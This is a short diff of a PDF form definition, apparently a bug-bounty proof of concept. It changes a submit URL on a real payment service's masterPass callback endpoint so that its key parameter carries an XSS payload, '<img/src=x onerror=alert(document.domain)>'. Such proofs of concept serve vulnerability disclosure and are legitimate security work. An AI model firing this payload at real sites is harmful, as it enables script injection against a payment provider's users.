@@ -56,7 +56,7 @@ endobj
 /F
         <<
         % URL TO SUBMIT TO:
-        /F (https://www.simplify.com/commerce/masterPass/callbackHandler?key=q<img/src=x onerror=alert(0)>qq)
+        /F (https://www.simplify.com/commerce/masterPass/callbackHandler?key=q<img/src=x onerror=alert(document.domain)>qq)
         /FS /URL
         >>
 % SPECIFIES THE FORMAT AND OTHER FORM RELATED CONFIGURATION
